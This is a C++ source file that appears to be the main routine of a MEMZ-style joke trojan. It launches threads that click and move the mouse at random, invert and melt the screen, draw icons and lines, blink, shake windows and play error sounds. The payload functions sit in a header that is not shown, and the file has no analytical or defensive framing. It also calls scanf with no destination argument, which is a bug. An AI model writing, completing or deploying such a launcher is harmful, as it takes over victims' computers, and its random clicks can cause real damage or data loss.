#include <thread>
#include "MEMZ.h" // Process Main 

using namespace std;

int main(){
    // SetConsoleRoundCorners(random_in(10,200),random_in(10,200),random_in(10,30)); // Setting Random Round Corners (Bugful)
    thread a(infclick); // Random Click
    thread b(infInvColor); // Invert Screen Color
    thread c(infIcon); // Random Draw Icons
    thread d(infCursor); // Random Move Mouse
    thread e(infChange); // Invert String
    thread f(inftunnel); // Draw Tunnel Effect 
    thread g(randomDraw); // Random Draw Lines
    thread h(infplay); // Play System Error Sounds
    thread i(infBlink); // Screen Blink
    thread j(InvertColor_slow); // Invert Screen Color (Slow) Like "Nepotonod"
    thread k(ScreenMelter); // Screen Melter Like "Nepotonod"
    thread l(infShock); // Window Shocker
    scanf("%s"); // Pause Program
}
